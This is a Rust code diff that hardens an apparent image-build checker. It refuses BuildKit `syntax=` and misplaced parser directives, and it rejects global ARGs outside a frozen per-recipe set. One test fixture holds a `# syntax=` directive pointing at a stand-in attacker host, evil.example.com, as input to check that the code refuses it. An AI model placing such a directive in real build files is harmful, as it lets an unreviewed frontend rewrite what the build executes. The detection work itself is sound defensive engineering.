@@ -3576,24 +3576,82 @@ struct FromInstruction {
     platform: Option<String>,
 }
 
+/// A parser directive in Docker's own shape: `# key=value`, whitespace free
+/// around `#` and `=`, key alphanumeric. BuildKit reads these only before the
+/// first comment, empty line or instruction.
+fn parser_directive(line: &str) -> Option<(&str, &str)> {
+    let rest = line.trim().strip_prefix('#')?.trim_start();
+    let key_end = rest
+        .find(|byte: char| !byte.is_ascii_alphanumeric())
+        .unwrap_or(rest.len());
+    let key = &rest[..key_end];
+    if !key.starts_with(|byte: char| byte.is_ascii_alphabetic()) {
+        return None;
+    }
+    let value = rest[key_end..].trim_start().strip_prefix('=')?.trim();
+    if value.is_empty() {
+        return None;
+    }
+    Some((key, value))
+}
+
+/// BuildKit's parser directives. `escape` changes how this reader joins a line;
+/// `syntax` replaces the frontend that reads every later line, and `check`
+/// changes the build's verdicts.
+const PARSER_DIRECTIVES: [&str; 3] = ["escape", "syntax", "check"];
+
 /// Join continuations and drop comment/blank lines, preserving instruction order.
-fn dockerfile_instructions(source: &str) -> Vec<String> {
+///
+/// A parser directive is refused rather than skipped, because both readings of a
+/// recipe have to be the build's reading of it (#235): `syntax=` would pull an
+/// unreviewed frontend over the pins this file checks, and a directive after the
+/// first comment, empty line or instruction is not a directive to BuildKit at
+/// all, so honouring one here would describe a parse the build never makes. A
+/// `# key=value` comment whose key BuildKit does not know is a comment here too.
+fn dockerfile_instructions(source: &str) -> Result<Vec<String>, String> {
     let mut instructions = Vec::new();
     let mut current = String::new();
+    let mut escape = '\\';
+    let mut leading = true;
     for line in source.lines() {
         let trimmed = line.trim();
+        if let Some((key, value)) = parser_directive(trimmed) {
+            if !leading {
+                if !PARSER_DIRECTIVES
+                    .iter()
+                    .any(|directive| key.eq_ignore_ascii_case(directive))
+                {
+                    continue;
+                }
+                return Err(format!(
+                    "parser directive outside the leading window: {key} (BuildKit stops reading \
+                     directives at the first comment, empty line or instruction)"
+                ));
+            }
+            if !key.eq_ignore_ascii_case("escape") {
+                return Err(format!(
+                    "unsupported parser directive: {key} (only escape is reviewed: syntax= \
+                     replaces the frontend that reads this recipe)"
+                ));
+            }
+            escape = match value {
+                "\\" => '\\',
+                "`" => '`',
+                _ => return Err(format!("unsupported escape directive: {value}")),
+            };
+            continue;
+        }
         if current.is_empty() && (trimmed.is_empty() || trimmed.starts_with('#')) {
+            leading = false;
             continue;
         }
-        let continued = line.trim_end().ends_with('\\');
+        leading = false;
+        let continued = line.trim_end().ends_with(escape);
         if continued {
-            current.push_str(line.trim_end().trim_end_matches('\\'));
-        } else {
-            current.push_str(line);
-        }
-        if continued {
+            current.push_str(line.trim_end().trim_end_matches(escape));
             continue;
         }
+        current.push_str(line);
         if !current.trim().is_empty() {
             instructions.push(current.trim().to_owned());
         }
@@ -3602,7 +3660,135 @@ fn dockerfile_instructions(source: &str) -> Vec<String> {
     if !current.trim().is_empty() {
         instructions.push(current.trim().to_owned());
     }
-    instructions
+    Ok(instructions)
+}
+
+/// The ARG names each maintained recipe declares today, whole file, frozen here:
+/// an ARG is one more build-time input to a recipe whose pins are reviewed as
+/// bytes, so a name outside this set is a review rather than an edit (#235).
+/// Whole file and not per stage, because the question is whether the recipe has
+/// ever named the input; script/test/example-layers.sh holds the same sets, and
+/// `review_global_args` holds them to the same reading.
+const REVIEWED_ARGS: [(&str, &[&str]); 7] = [
+    (
+        "examples/base-extension/Dockerfile",
+        &["AGENT_VM_BASE_IDENTITY", "BASE_IMAGE"],
+    ),
+    (
+        "examples/layers/chrome-devtools/Dockerfile",
+        &["BASE_IMAGE"],
+    ),
+    (
+        "examples/layers/go-dev/Dockerfile",
+        &[
+            "BASE_IMAGE",
+            "GO_AMD64_SHA256",
+            "GO_ARM64_SHA256",
+            "GO_PREFIX",
+            "GO_TOOLS_BIN",
+            "GO_VERSION",
+            "GOLANGCI_LINT_AMD64_SHA256",
+            "GOLANGCI_LINT_ARM64_SHA256",
+            "GOLANGCI_LINT_VERSION",
+            "GOPLS_VERSION",
+        ],
+    ),
+    (
+        "examples/layers/rust-dev/Dockerfile",
+        &[
+            "BASE_IMAGE",
+            "CARGO_HOME",
+            "KACHE_AMD64_SHA256",
+            "KACHE_ARM64_SHA256",
+            "KACHE_DIR",
+            "KACHE_RELEASE_CERT_SHA256",
+            "KACHE_VERSION",
+            "RUSTUP_HOME",
+            "RUST_TOOLCHAIN",
+            "VERUS_DIR",
+            "VERUS_RELEASE",
+            "VERUS_SHA256",
+        ],
+    ),
+    ("examples/layers/wirenboard-cpp/Dockerfile", &["BASE_IMAGE"]),
+    (
+        "images/Dockerfile",
+        &[
+            "BUILD_CA_SHA256",
+            "CA_SHIM_CACHEBUST",
+            "TARGETARCH",
+            "ZELLIJ_SHA256_AMD64",
+            "ZELLIJ_SHA256_ARM64",
+            "ZELLIJ_VERSION",
+        ],
+    ),
+    (
+        "images/standard/Dockerfile",
+        &[
+            "AGENT_VERSION_AGY",
+            "AGENT_VERSION_CLAUDE",
+            "AGENT_VERSION_CODEX",
+            "AGENT_VERSION_COPILOT",
+            "AGENT_VERSION_DSH",
+            "AGENT_VERSION_OPENCODE",
+            "AGENT_VERSION_OPENCODE_CLAUDE",
+            "AGENT_VERSION_PI",
+            "AGENT_VERSION_PI_ANTIGRAVITY",
+            "AGENT_VERSION_PI_CLAUDE_BRIDGE",
+            "AGENT_VERSION_PNPM",
+            "BASE_IMAGE",
+            "TARGETARCH",
+        ],
+    ),
+];
+
+/// The declared ARG names of a recipe: `global_only` stops at the first `FROM`.
+fn arg_names(instructions: &[String], global_only: bool) -> Vec<&str> {
+    let mut names = Vec::new();
+    for instruction in instructions {
+        let upper = instruction.to_ascii_uppercase();
+        if global_only && upper.starts_with("FROM ") {
+            break;
+        }
+        if !upper.starts_with("ARG ") {
+            continue;
+        }
+        for declaration in instruction.split_whitespace().skip(1) {
+            names.push(declaration.split('=').next().unwrap_or(declaration));
+        }
+    }
+    names
+}
+
+/// A global ARG is in scope on the `FROM` lines and nowhere else, which is what
+/// makes it worth refusing by name: it retargets a parent without touching an
+/// instruction any other check in this file reads.
+fn review_global_args(path: &str, instructions: &[String]) -> Result<(), String> {
+    let declared = arg_names(instructions, false);
+    let global = arg_names(instructions, true);
+    let Some((_, reviewed)) = REVIEWED_ARGS.iter().find(|(recipe, _)| *recipe == path) else {
+        return if global.is_empty() {
+            Ok(())
+        } else {
+            Err(format!(
+                "{path}: no reviewed ARG set for a recipe that declares a global ARG: {}",
+                global.join(", ")
+            ))
+        };
+    };
+    for name in &global {
+        if !reviewed.contains(name) {
+            return Err(format!("{path}: unreviewed global ARG: {name}"));
+        }
+    }
+    for name in *reviewed {
+        if !declared.contains(name) {
+            return Err(format!(
+                "{path}: no longer declares the reviewed ARG {name}"
+            ));
+        }
+    }
+    Ok(())
 }
 
 /// Global `ARG NAME=default` declarations, i.e. those before the first `FROM`.
@@ -3651,10 +3837,21 @@ fn resolve_from_image(raw: &str, defaults: &BTreeMap<String, String>) -> Result<
 }
 
 fn parse_froms(source: &str) -> Result<Vec<FromInstruction>, String> {
-    let instructions = dockerfile_instructions(source);
-    let defaults = global_defaults(&instructions);
+    collect_froms(&dockerfile_instructions(source)?)
+}
+
+/// A maintained recipe: its directives and ARGs are reviewed before its parents
+/// are read, so the bytes this file refuses are the bytes it then parses.
+fn parse_recipe(path: &str, source: &str) -> Result<Vec<FromInstruction>, String> {
+    let instructions = dockerfile_instructions(source)?;
+    review_global_args(path, &instructions)?;
+    collect_froms(&instructions)
+}
+
+fn collect_froms(instructions: &[String]) -> Result<Vec<FromInstruction>, String> {
+    let defaults = global_defaults(instructions);
     let mut froms = Vec::new();
-    for instruction in &instructions {
+    for instruction in instructions {
         if !instruction.to_ascii_uppercase().starts_with("FROM ") {
             continue;
         }
@@ -3740,7 +3937,7 @@ fn check_recipe_parents(
         ));
     }
     for (path, source) in recipes {
-        let froms = parent_froms(parse_froms(source)?);
+        let froms = parent_froms(parse_recipe(path, source)?);
         let specs = &inventory.recipes[path];
         if froms.len() != specs.len() {
             return Err(format!(
@@ -4994,7 +5191,7 @@ fn base_input_manifest_paths() -> Vec<String> {
 /// machine that built the image.
 fn artifact_install_run(base: &str) -> Result<String, String> {
     let installer = format!("{ARTIFACT_SOURCE_ROOT}/{ARTIFACT_INSTALLER}");
-    let runs: Vec<String> = dockerfile_instructions(base)
+    let runs: Vec<String> = dockerfile_instructions(base)?
         .into_iter()
         .filter(|instruction| {
             instruction.starts_with("RUN ") && instruction.contains(&format!("bash {installer}"))
@@ -6532,7 +6729,7 @@ fn the_base_recipe_installs_the_pinned_artifacts_through_the_installer() {
 
 /// The agy recipe's one install RUN, or why the recipe does not describe one.
 fn agy_install_run(text: &str) -> Result<String, String> {
-    let runs: Vec<String> = dockerfile_instructions(text)
+    let runs: Vec<String> = dockerfile_instructions(text)?
         .into_iter()
         .filter(|instruction| {
             instruction.starts_with("RUN ") && instruction.contains("sh /tmp/install-agy.sh")
@@ -6648,7 +6845,7 @@ fn check_agy_recipe(text: &str) -> Result<(), String> {
             ));
         }
     }
-    let certification = dockerfile_instructions(text)
+    let certification = dockerfile_instructions(text)?
         .into_iter()
         .find(|instruction| instruction.contains("sh /tmp/verify-standard.sh"))
         .ok_or("the standard recipe has no final gate")?;
@@ -7126,6 +7323,88 @@ fn from_parsing_keeps_raw_and_resolved_forms() {
     }
 }
 
+/// `# syntax=` pulls a frontend image over the network and that image reads every
+/// later line, so the pins checked here would describe bytes a different parser
+/// read (#235). It is refused wherever it appears, and the refusal names it.
+#[test]
+fn syntax_directives_are_refused() {
+    for source in [
+        "# syntax=evil.example.com/frontend:latest\nARG BASE_IMAGE=agent-vm-base:local\nFROM ${BASE_IMAGE}\n",
+        "# a comment\n# syntax=docker/dockerfile:1\nFROM debian:13\n",
+    ] {
+        let error = parse_froms(source).expect_err("a syntax directive must be refused");
+        assert!(
+            error.contains("syntax"),
+            "the refusal must name the directive: {error}"
+        );
+    }
+}
+
+/// A parser directive the build ignores is a parse this reader must not make:
+/// BuildKit stops reading them at the first comment, empty line or instruction,
+/// so an `escape` honoured there would join continuations the build keeps apart.
+#[test]
+fn directives_after_the_leading_window_are_refused() {
+    let honoured =
+        parse_froms("# escape=`\nARG BASE_IMAGE=agent-vm-base:local\nFROM `\n ${BASE_IMAGE}\n")
+            .expect("a leading escape directive is reviewed and honoured");
+    assert_eq!(
+        honoured[0].resolved_image, LOCAL_BASE,
+        "the escape directive must join the continued FROM"
+    );
+    let error = parse_froms("# An ordinary comment\n# escape=`\nFROM `\n debian:13\n")
+        .expect_err("an escape directive after a comment must be refused");
+    assert!(
+        error.contains("outside the leading window") && error.contains("escape"),
+        "the refusal must place the directive and name it: {error}"
+    );
+    assert_eq!(
+        dockerfile_instructions("# a comment\n# GOTOOLCHAIN=local is prose\nFROM debian:13\n")
+            .unwrap(),
+        vec!["FROM debian:13".to_owned()],
+        "a directive-shaped comment with a key BuildKit does not know stays a comment"
+    );
+}
+
+/// A global ARG is in scope on the FROM lines only, so it retargets a parent
+/// without touching an instruction any other check reads. The reviewed set is
+/// per recipe and over the whole file: an existing name may move to the top
+/// level, a name the recipe never declared is refused with its name (#235).
+#[test]
+fn unreviewed_global_args_are_refused() {
+    let path = "examples/layers/go-dev/Dockerfile";
+    let source = read_text(path);
+    let added = source.replacen(
+        "ARG BASE_IMAGE=",
+        "ARG GOFLAGS=-tags=example_fixture\nARG BASE_IMAGE=",
+        1,
+    );
+    assert_ne!(added, source, "the mutation did not apply");
+    let error = parse_recipe(path, &added).expect_err("an unreviewed global ARG is refused");
+    assert!(
+        error.contains("unreviewed global ARG: GOFLAGS"),
+        "the refusal must name the ARG: {error}"
+    );
+    let moved = source.replacen(
+        "\nFROM ${BASE_IMAGE}\n",
+        "\nARG GO_VERSION\nFROM ${BASE_IMAGE}\n",
+        1,
+    );
+    assert_ne!(moved, source, "the mutation did not apply");
+    assert!(
+        parse_recipe(path, &moved).is_ok(),
+        "a name the recipe already declares may move to the top level"
+    );
+    // Every maintained recipe is covered by its own set, so a new recipe cannot
+    // borrow another one's review.
+    for (recipe, _) in REVIEWED_ARGS {
+        assert!(
+            parse_recipe(recipe, &read_text(recipe)).is_ok(),
+            "{recipe} must pass its own reviewed ARG set"
+        );
+    }
+}
+
 /// Ordinary builds never invoke the maintenance path: no maintained recipe or
 /// installer, build entrypoint or workflow may resolve parents or call the
 /// refresher. Documentation may describe the maintenance commands; the test and
@@ -7446,7 +7725,7 @@ struct StampRun {
 /// images-relative paths the manifest lists are the ones hashed.
 fn parse_stamp_run(source: &str) -> Result<StampRun, String> {
     let mut runs: Vec<StampRun> = Vec::new();
-    for instruction in dockerfile_instructions(source) {
+    for instruction in dockerfile_instructions(source)? {
         if !instruction.starts_with("RUN ") || !instruction.contains(BASE_VERIFIER) {
             continue;
         }
@@ -7537,7 +7816,7 @@ fn check_stamp_runs(base: &str, standard: &str) -> Result<(), String> {
 /// The stamp is the last build step, so it covers everything the recipe
 /// installed; only CMD may follow it.
 fn check_base_stamp_is_last_run(base: &str) -> Result<(), String> {
-    let instructions = dockerfile_instructions(base);
+    let instructions = dockerfile_instructions(base)?;
     let Some(position) = instructions
         .iter()
         .rposition(|instruction| instruction.starts_with("RUN "))
@@ -7564,7 +7843,7 @@ fn check_base_stamp_is_last_run(base: &str) -> Result<(), String> {
 /// inherited parent stamp. Anything else first would install against a base from
 /// other sources, or fail late with a bare "not found" from an installer.
 fn check_standard_verify_is_first_product_run(standard: &str) -> Result<(), String> {
-    let instructions = dockerfile_instructions(standard);
+    let instructions = dockerfile_instructions(standard)?;
     let Some(start) = instructions.iter().rposition(|instruction| {
         instruction.to_ascii_uppercase().starts_with("FROM ")
             && instruction.contains("${BASE_IMAGE}")
@@ -7600,7 +7879,7 @@ fn check_standard_verify_is_first_product_run(standard: &str) -> Result<(), Stri
 /// `COPY` or bind mount outside the roots is a source the manifest does not
 /// describe, and the generator and mount list have to grow together.
 fn check_base_context_sources(base: &str) -> Result<(), String> {
-    for instruction in dockerfile_instructions(base) {
+    for instruction in dockerfile_instructions(base)? {
         let tokens: Vec<&str> = instruction.split_whitespace().collect();
         let Some(name) = tokens.first() else { continue };
         match name.to_ascii_uppercase().as_str() {
@@ -7715,13 +7994,13 @@ fn check_image_inputs(
         .map(|pin| pin.reference().digest.value().to_owned())
         .collect();
     for (path, source) in recipes {
-        let froms = parse_froms(source)?;
+        let froms = parse_recipe(path, source)?;
         let stages: BTreeSet<String> = froms
             .iter()
             .filter_map(|from| from.stage.as_deref())
             .map(str::to_ascii_lowercase)
             .collect();
-        for instruction in dockerfile_instructions(source) {
+        for instruction in dockerfile_instructions(source)? {
             for reference in image_input_references(&instruction) {
                 check_image_reference(path, &reference, &stages, froms.len(), &known)?;
             }
@@ -7745,7 +8024,7 @@ fn is_package_step(instruction: &str) -> bool {
 /// invocation used to leave the static gate green, so both call sites are
 /// required here: the baseline is only a baseline if it runs first.
 fn check_apt_baseline_brackets_build(base: &str) -> Result<(), String> {
-    let instructions = dockerfile_instructions(base);
+    let instructions = dockerfile_instructions(base)?;
     let checks: Vec<usize> = instructions
         .iter()
         .enumerate()
@@ -7893,7 +8172,7 @@ fn glob_match(pattern: &[u8], text: &[u8]) -> bool {
 /// The copied extension is the one consumer that carries its expectation in its
 /// own bytes: the generated default is this checkout's manifest identity.
 fn extension_identity(extension: &str) -> Result<String, String> {
-    let instructions = dockerfile_instructions(extension);
+    let instructions = dockerfile_instructions(extension)?;
     let defaults = global_defaults(&instructions);
     if defaults.get("BASE_IMAGE").map(String::as_str) != Some(LOCAL_BASE) {
         return Err(format!(
